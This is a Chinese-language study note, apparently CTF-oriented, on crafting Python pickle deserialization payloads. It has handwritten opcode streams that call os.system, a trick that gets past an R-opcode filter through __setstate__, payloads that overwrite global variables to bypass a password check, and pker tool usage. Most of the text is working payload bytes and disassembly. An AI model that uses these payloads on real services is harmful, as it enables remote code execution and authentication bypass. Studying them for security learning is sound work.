### 构造反序列化payload

>https://github.com/Macr0phag3/souse
>
>#### 注意事项
>
>pickle序列化的结果与操作系统有关，使用windows构建的payload可能不能在linux上运行。比如：
>
>```
># linux(注意posix):
>b'cposix\nsystem\np0\n(Vwhoami\np1\ntp2\nRp3\n.'
>
># windows(注意nt):
>b'cnt\nsystem\np0\n(Vwhoami\np1\ntp2\nRp3\n.'
>```

#### 全局引入

```python
import secret

class Target:
    def __init__(self):
        obj = pickle.loads(ser)  # 输入点
        if obj.pwd == secret.pwd:
            print("Hello, admin!")
```

exp

```python
import pickle
import pickletools

class secret:
    pwd = "???"

class Target:
    def __init__(self):
        self.pwd = secret.pwd

test = Target()

serialized = pickletools.optimize(pickle.dumps(test, protocol=3))
print(serialized)
pickletools.dis(serialized)
'''
结果
b'\x80\x03c__main__\nTarget\n)\x81}X\x03\x00\x00\x00pwdX\x03\x00\x00\x00???sb.'

payload
b'\x80\x03c__main__\nTarget\n)\x81}X\x03\x00\x00\x00pwdcsecret\npwd\nsb.'
'''

pickletools.dis(pickletools.optimize(b'\x80\x03c__main__\nTarget\n)\x81}X\x03\x00\x00\x00pwdcsecret\npwd\nsb.'))
print('pickle pwd -> ' + pickle.loads(b'\x80\x03c__main__\nTarget\n)\x81}X\x03\x00\x00\x00pwdcsecret\npwd\nsb.').pwd)
```

```Python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Time    : 2023/10/17 20:35
# @Author  : wi1111
# @File    : pickle_demo.py
# @Software: PyCharm python3.9
import pickle
import pickletools

"""
import secret

class Target:
    def __init__(self):
        obj = pickle.loads(ser)  # 输入点
        if obj.pwd == secret.pwd:
            print("Hello, admin!")
"""

class secret:
    pwd = "???"

class Target:
    def __init__(self):
        self.pwd = secret.pwd

test = Target()

serialized = pickletools.optimize(pickle.dumps(test, protocol=0))
print(serialized)
pickletools.dis(serialized)

# 结果
# b'ccopy_reg\n_reconstructor\n(c__main__\nTarget\nc__builtin__\nobject\nNtR(dVpwd\nV???\nsb.'

# payload
# b'ccopy_reg\n_reconstructor\n(c__main__\nTarget\nc__builtin__\nobject\nNtR(dVpwd\ncsecret\npwd\nsb.'
```

#### 引入魔术方法

```python
class Target:
    def __init__(self):
        ser = ""  # 输入点
        if "R" in ser:
            print("Hack! <=@_@")
        else:
            obj = pickle.loads(ser)
```

先看常规payload

```python
class exp_demo:

    def __reduce__(self):
        import os
        return os.system, ('whoami', )
print(pickletools.optimize(pickle.dumps(exp_demo(), protocol=0)))
pickletools.dis(pickletools.optimize(pickle.dumps(exp_demo(), protocol=0)))
# 常规： b'cnt\nsystem\n(Vwhoami\ntR.'
```

对于这个例子来说，要想 RCE，需要过这里的 if，也就是不能用 `R`。

这 R 如何去除呢？`b` 就派上用场了。

```Python
class exp_demo:

    def __init__(self):
        import os
        self.__setstate__ = os.system

    # def __reduce__(self):
    #     import os
    #     return os.system, ('whoami', )

print('2————————————————————————————————————————————————————————————————————————')
print(pickletools.optimize(pickle.dumps(exp_demo(), protocol=0)))
pickletools.dis(pickletools.optimize(pickle.dumps(exp_demo(), protocol=0)))
# 常规： b'cnt\nsystem\n(Vwhoami\ntR.'
# 自动生成paylaod：b'ccopy_reg\n_reconstructor\n(c__main__\nexp_demo\nc__builtin__\nobject\nNtR(dV__setstate__\ncnt\nsystem\nsb.'
# payload：b'ccopy_reg\n_reconstructor\n(c__main__\nexp_demo\nc__builtin__\nobject\nNtR(dV__setstate__\ncnt\nsystem\nsbVwhoami\nb.'

# 你会发现里面还是存在R用于构建实例，这时候就要更换版本，利用\x81来创建实例
# \x81 其实就是通过 cls.__new__ 来创建一个实例，需要栈顶有 args（元组） 和 kwds（字典）。
print(pickletools.optimize(pickle.dumps(exp_demo(), protocol=3)))
pickletools.dis(pickletools.optimize(pickle.dumps(exp_demo(), protocol=3)))
"""
b'\x80\x03c__main__\nexp_demo\n)\x81}X\x0c\x00\x00\x00__setstate__cnt\nsystem\nsb.'
    0: \x80 PROTO      3
    2: c    GLOBAL     '__main__ exp_demo'
   21: )    EMPTY_TUPLE
   22: \x81 NEWOBJ
   23: }    EMPTY_DICT
   24: X    BINUNICODE '__setstate__'
   41: c    GLOBAL     'nt system'
   52: s    SETITEM
   53: b    BUILD
   54: .    STOP
highest protocol among opcodes = 2

payload：b'\x80\x03c__main__\nexp_demo\n)\x81}X\x0c\x00\x00\x00__setstate__cnt\nsystem\nsbVwhoami\nb.'
"""
```

回顾一下它的作用：使用栈中的第一个元素（储存多个 属性名-属性值 的字典）对第二个元素（对象实例）进行属性/方法的设置。既然可以设置实例的方法，那么能不能设置一个方法让它在反序列化的时候自动运行呢？什么方法会在反序列化的时候自动运行，答案是上面提到的 `__setstate__()`。

所以，我们只需要令 `__setstate__ = os.system`，再把参数传入即可：

```
b'\x80\x03c__main__\nexp_demo\n)\x81}X\x0c\x00\x00\x00__setstate__cnt\nsystem\nsbVwhoami\nb.'
    0: \x80 PROTO      3
    2: c    GLOBAL     '__main__ exp_demo'
   21: )    EMPTY_TUPLE
   22: \x81 NEWOBJ
   23: }    EMPTY_DICT
   24: X    BINUNICODE '__setstate__'
   41: c    GLOBAL     'nt system'
   52: s    SETITEM
   53: b    BUILD
   54: V    UNICODE    'whoami'
   62: b    BUILD
   63: .    STOP
highest protocol among opcodes = 2
修改步骤就是在自动生成的payload上第一次b构建完成后，此时__setstate__已经不再是None，只需再次构建传进参数即可调用到__setstate__。
```

![](https://github.com/wi1shu7/day_day_up/blob/main/daydayup.assets/image-20231018002948755.png)

>### BINUNICODE操作码
>
>BINUNICODE = b'X' 这个操作码的含义是将一个Unicode字符串压入pickle的数据栈中，这个Unicode字符串是一个以UTF-8编码的字符串。
>
>"counted UTF-8 string argument"指的是：这个操作码后面跟着的数据是一个计数的UTF-8字符串，即首先有一个整数表示字符串的长度，然后是实际的字符串数据。这种格式可以让pickle知道在读取字符串时应读取多少字节。
>
>至于如何触发这个操作码，当你尝试pickle一个包含Unicode字符串的Python对象时，这个操作码就会被触发。例如：
>
>```python
>import pickle
>
>data = {'key': '这是一个Unicode字符串'}
>pickle.dumps(data)
>```
>
>在这个例子中，当pickle模块尝试序列化这个字典时，会使用BINUNICODE操作码来处理值为Unicode字符串的部分。
>
>所以可以看到`V`需要最后使用`\n`来分割，而`X`因为有前四个字节表示字符串长度，所以无需在最后使用`\n`来分割。
>![](https://github.com/wi1shu7/day_day_up/blob/main/daydayup.assets/image-20231018004135499.png)
>
>`BINUNICODE`操作码在Python的pickle协议中用于表示长度为4字节的Unicode字符串。这意味着它可以表示长度为2^32-1的字符串。如果字符串长度超出这个范围，那么pickle模块会使用不同的操作码来处理这种情况。
>
>在Python的pickle协议中，有一个叫做`BINUNICODE8`的操作码，这个操作码用于处理长度超过4字节的Unicode字符串。`BINUNICODE8`操作码可以处理长度为2^64-1的字符串，这个长度远远超过了大多数实际使用情况的需求。
>
>所以，如果你尝试pickle一个长度超过`BINUNICODE`可以表示的字符串，Python的pickle模块会自动使用`BINUNICODE8`操作码来处理这种情况，你不需要手动进行任何操作。

####  变量与方法覆盖

```python
PWD = "???"  # 已打码

class Target2_test:
    PWD_TEST = 111

class Target:
    def __init__(self):
        obj = pickle.loads(ser)  # 输入点
        if obj.pwd == PWD:
            print("Hello, admin!")
            
            
# import builtins
# builtins.globals()["PWD"] = ""  # 先把 PWD 改成一个值
# obj.pwd = ""  # 再让 obj.pwd 也等于这个值
# print(__import__('builtins').globals())

# payload: b'\x80\x03cbuiltins\nglobals\n)R(VPWD\nVwi1\nu0c__main__\nTarget2\n)\x81}(Vpwd\nVwi1\nub.'
payload2 = b'\x80\x03cbuiltins\nglobals\n)R(VPWD\nVwi1\nu0c__main__\nTarget2\n)\x81}(Vpwd\nVwi1\nub.'
print(payload2)
pickletools.dis(payload2)
Target2(payload2)
"""
b'\x80\x03cbuiltins\nglobals\n)R(VPWD\nVwi1\nu0c__main__\nTarget2\n)\x81}(Vpwd\nVwi1\nub.'
    0: \x80 PROTO      3
    2: c    GLOBAL     'builtins globals'
   20: )    EMPTY_TUPLE
   21: R    REDUCE
   22: (    MARK
   23: V        UNICODE    'PWD'
   28: V        UNICODE    'wi1'
   33: u        SETITEMS   (MARK at 22)
   34: 0    POP
   35: c    GLOBAL     '__main__ Target2'
   53: )    EMPTY_TUPLE
   54: \x81 NEWOBJ
   55: }    EMPTY_DICT
   56: (    MARK
   57: V        UNICODE    'pwd'
   62: V        UNICODE    'wi1'
   67: u        SETITEMS   (MARK at 56)
   68: b    BUILD
   69: .    STOP
highest protocol among opcodes = 2
"""


# 获取到 Target2_test 类的内部的值，利用i
# payload: b'(c__main__\nTarget2_test\nVPWD_TEST\nibuiltins\ngetattr\n.'
print(b'(c__main__\nTarget2_test\nVPWD_TEST\nibuiltins\ngetattr\n.')
pickletools.dis(b'(c__main__\nTarget2_test\nVPWD_TEST\nibuiltins\ngetattr\n.')


print(pickle.loads(b'(c__main__\nTarget2_test\nVPWD_TEST\nibuiltins\ngetattr\n.'))
"""
b'(c__main__\nTarget2_test\nVPWD_TEST\nibuiltins\ngetattr\n.'
    0: (    MARK
    1: c        GLOBAL     '__main__ Target2_test'
   24: V        UNICODE    'PWD_TEST'
   34: i        INST       'builtins getattr' (MARK at 0)
   52: .    STOP
highest protocol among opcodes = 0
"""
```

通过`import builtins`，利用其中的`globals`覆盖`PWD`，然后再用`0`弹出栈里的 `builtins.globals()` ，因为`builtins.globals()`是一个字典没有办法利用`.`来获取值也就是没有`__getattribute__`方法，所以再压入一个`Target2`实例，然后利用`\x81`来实例化对象，再用`b`给其附上属性`pwd`的值，就完成了覆盖

如果要获取一个对象或者类的属性，可以使用`i`来获取，通过调用内置方法中的`getattr`来获取到某个对象或者类中的属性。

当然，方法也是可以进行覆盖的

>### `sys.modules`
>
>`sys.modules` 是一个 Python 内置模块 `sys` 中的字典，它保存了当前解释器中已经导入的所有模块的引用。
>
>当你在 Python 中导入一个模块时，解释器会在 `sys.modules` 中查找该模块的引用。如果模块已经存在于 `sys.modules` 中，解释器会直接使用该引用，而不会重新加载模块。这样可以避免多次导入同一个模块，提高了导入的效率。
>
>`sys.modules` 中的模块引用是动态更新的。当你导入新的模块或重新加载模块时，`sys.modules` 会相应地更新。
>
>`sys.modules` 的键是模块的名称，值是对应模块的引用。你可以使用 `sys.modules` 来查看当前解释器中已经导入的模块。
>
>### `builtins.globals`
>
>`builtins.globals` 是一个内置模块 `builtins` 下的字典，它保存了当前作用域中的全局变量和函数的引用。
>
>`builtins` 模块是 Python 解释器在启动时自动导入的模块，它包含了一些内置的函数、异常和对象。`builtins.globals` 是 `builtins` 模块中的一个字典，它提供了对当前全局命名空间中的对象的访问。
>
>通过 `builtins.globals`，你可以获取当前作用域中定义的全局变量和函数的引用。这些引用被存储在 `builtins.globals` 字典中，以变量名作为键，以对应的对象作为值。
>
>需要注意的是，`builtins.globals` 提供了对全局作用域中的对象的访问，而不是所有作用域中的对象。如果你在一个函数内部调用 `builtins.globals`，它将返回该函数所在的作用域中的全局对象。

```Python
import sys
p0 = sys.modules
p0["sys"] = p0
import sys
p0["sys"] = sys.get("os")
```

用 `dir()` 来查看属性和方法，其实它在参数不同的时候，查询的逻辑是不一样的：

[![](https://github.com/wi1shu7/day_day_up/blob/main/daydayup.assets/98a6e69c-927e-4960-ae87-e92636533d13.png)]()

另外特别注意的是，有些对象的 `__dict__` 属于 `mappingproxy` 类型，例如类对象和类实例，如果直接用 `b` 对`mappingproxy` 类型进行属性修改的话，会抛出异常

```python
try:
    Target2.__dict__['A'] = 1
except:
    traceback.print_exc()
    '''
    Traceback (most recent call last):
      File "C:\Users\Lenovo\PycharmProjects\pythonProject\demo\opcode_test.py", line 85, in <module>
        Target2.__dict__['A'] = 1
    TypeError: 'mappingproxy' object does not support item assignment
    '''
```

![](https://github.com/wi1shu7/day_day_up/blob/main/daydayup.assets/image-20231018214724999.png)

![](https://github.com/wi1shu7/day_day_up/blob/main/daydayup.assets/image-20231018215123724.png)

再看源码，如果 `state` 是两个元素的元组，那么会执行 `state, slotstate = state`，如果此时 `state in [None, {}]`（由于 `_pickle` 逻辑问题，是没办法让 state 等于 `''`、`0` 等这种值的），那么就会跑去执行 `setattr(inst, k, v)`，这是 mappingproxy 类型允许的

所以，假如有一个库是 A，里面有个类 b，要修改 b 的属性，原本要执行的 `cA\nb\n}Va\nI1\nsb.` 应该改为 `cA\nb\n(N}Va\nI1\ntsb.` 或者 `cA\nb\n(}}Va\nI1\ntsb.`

>#### 拼接opcode
>
>将第一个pickle流结尾表示结束的 `.` 去掉，将第二个pickle流与第一个拼接起来即可。
>
>#### 全局变量覆盖
>
>python源码：
>
>```
># secret.py
>name='TEST3213qkfsmfo'
># main.py
>import pickle
>import secret
>
>opcode='''c__main__
>secret
>(S'name'
>S'1'
>db.'''
>
>print('before:',secret.name)
>
>output=pickle.loads(opcode.encode())
>
>print('output:',output)
>print('after:',secret.name)
>```
>
>首先，通过 `c` 获取全局变量 `secret` ，然后建立一个字典，并使用 `b` 对secret进行属性设置，使用到的payload：
>
>```
>opcode='''c__main__
>secret
>(S'name'
>S'1'
>db.'''
>```
>
>#### 函数执行
>
>与函数执行相关的opcode有三个： `R` 、 `i` 、 `o` ，所以我们可以从三个方向进行构造：
>
>1. `R` ：
>
>```
>b'''cos
>system
>(S'whoami'
>tR.'''
>```
>
>1. `i` ：
>
>```
>b'''(S'whoami'
>ios
>system
>.'''
>```
>
>1. `o` ：
>
>```
>b'''(cos
>system
>S'whoami'
>o.'''
>```
>
>#### 实例化对象
>
>实例化对象是一种特殊的函数执行，这里简单的使用 `R` 构造一下，其他方式类似：
>
>```
>class Student:
>    def __init__(self, name, age):
>        self.name = name
>        self.age = age
>
>data=b'''c__main__
>Student
>(S'XiaoMing'
>S"20"
>tR.'''
>
>a=pickle.loads(data)
>print(a.name,a.age)
>```
>
>#### pker的使用（推荐）
>
>- pker是由@eddieivan01编写的以仿照Python的形式产生pickle opcode的解析器，可以在https://github.com/eddieivan01/pker下载源码。解析器的原理见作者的paper：[通过AST来构造Pickle opcode](https://xz.aliyun.com/t/7012)。
>- 使用pker，我们可以更方便地编写pickle opcode，pker的使用方法将在下文中详细介绍。需要注意的是，建议在能够手写opcode的情况下使用pker进行辅助编写，不要过分依赖pker。
>
>#### 注意事项
>
>pickle序列化的结果与操作系统有关，使用windows构建的payload可能不能在linux上运行。比如：
>
>```
># linux(注意posix):
>b'cposix\nsystem\np0\n(Vwhoami\np1\ntp2\nRp3\n.'
>
># windows(注意nt):
>b'cnt\nsystem\np0\n(Vwhoami\np1\ntp2\nRp3\n.'
>```
>
>### pker能做的事
>
>引用自https://xz.aliyun.com/t/7012#toc-5：
>
>> - 变量赋值：存到memo中，保存memo下标和变量名即可
>> - 函数调用
>> - 类型字面量构造
>> - list和dict成员修改
>> - 对象成员变量修改
>
>具体来讲，可以使用pker进行原变量覆盖、函数执行、实例化新的对象。
>
>### 使用方法与示例
>
>1. pker中的针对pickle的特殊语法需要重点掌握（后文给出示例）
>2. 此外我们需要注意一点：python中的所有类、模块、包、属性等都是对象，这样便于对各操作进行理解。
>3. pker主要用到`GLOBAL、INST、OBJ`三种特殊的函数以及一些必要的转换方式，其他的opcode也可以手动使用：
>
>```
>以下module都可以是包含`.`的子module
>调用函数时，注意传入的参数类型要和示例一致
>对应的opcode会被生成，但并不与pker代码相互等价
>
>GLOBAL
>对应opcode：b'c'
>获取module下的一个全局对象（没有import的也可以，比如下面的os）：
>GLOBAL('os', 'system')
>输入：module,instance(callable、module都是instance)  
>
>INST
>对应opcode：b'i'
>建立并入栈一个对象（可以执行一个函数）：
>INST('os', 'system', 'ls')  
>输入：module,callable,para 
>
>OBJ
>对应opcode：b'o'
>建立并入栈一个对象（传入的第一个参数为callable，可以执行一个函数））：
>OBJ(GLOBAL('os', 'system'), 'ls') 
>输入：callable,para
>
>xxx(xx,...)
>对应opcode：b'R'
>使用参数xx调用函数xxx（先将函数入栈，再将参数入栈并调用）
>
>li[0]=321
>或
>globals_dic['local_var']='hello'
>对应opcode：b's'
>更新列表或字典的某项的值
>
>xx.attr=123
>对应opcode：b'b'
>对xx对象进行属性设置
>
>return
>对应opcode：b'0'
>出栈（作为pickle.loads函数的返回值）：
>return xxx # 注意，一次只能返回一个对象或不返回对象（就算用逗号隔开，最后也只返回一个元组）
>```
>
>注意：
>
>1. 由于opcode本身的功能问题，pker肯定也不支持列表索引、字典索引、点号取对象属性作为**左值**，需要索引时只能先获取相应的函数（如`getattr`、`dict.get`）才能进行。但是因为存在`s`、`u`、`b`操作符，**作为右值是可以的**。即“查值不行，赋值可以”。
>2. pker解析`S`时，用单引号包裹字符串。所以pker代码中的双引号会被解析为单引号opcode:
>
>```
>test="123"
>return test
>```
>
>被解析为：
>
>```
>b"S'123'\np0\n0g0\n."
>```
>
>#### pker：全局变量覆盖
>
>- 覆盖直接由执行文件引入的`secret`模块中的`name`与`category`变量：
>
>```
>secret=GLOBAL('__main__', 'secret') 
># python的执行文件被解析为__main__对象，secret在该对象从属下
>secret.name='1'
>secret.category='2'
>```
>
>- 覆盖引入模块的变量：
>
>```
>game = GLOBAL('guess_game', 'game')
>game.curr_ticket = '123'
>```
>
>接下来会给出一些具体的基本操作的实例。
>
>#### pker：函数执行
>
>- 通过`b'R'`调用：
>
>```
>s='whoami'
>system = GLOBAL('os', 'system')
>system(s) # `b'R'`调用
>return
>```
>
>- 通过`b'i'`调用：
>
>```
>INST('os', 'system', 'whoami')
>```
>
>- 通过`b'c'`与`b'o'`调用：
>
>```
>OBJ(GLOBAL('os', 'system'), 'whoami')
>```
>
>- 多参数调用函数
>
>```
>INST('[module]', '[callable]'[, par0,par1...])
>OBJ(GLOBAL('[module]', '[callable]')[, par0,par1...])
>```
>
>#### pker：实例化对象
>
>- 实例化对象是一种特殊的函数执行
>
>```
>animal = INST('__main__', 'Animal','1','2')
>return animal
>
>
># 或者
>
>animal = OBJ(GLOBAL('__main__', 'Animal'), '1','2')
>return animal
>```
>
>- 其中，python原文件中包含：
>
>```
>class Animal:
>
>    def __init__(self, name, category):
>        self.name = name
>        self.category = category
>```
>
>- 也可以先实例化再赋值：
>
>```
>animal = INST('__main__', 'Animal')
>animal.name='1'
>animal.category='2'
>return animal
>```
>
>#### 手动辅助
>
>- 拼接opcode：将第一个pickle流结尾表示结束的`.`去掉，两者拼接起来即可。
>- 建立普通的类时，可以先pickle.dumps，再拼接至payload。
>
>#### [Macr0phag3/souse: A tool for converting Python source code to opcode(pickle) (github.com)](https://github.com/Macr0phag3/souse)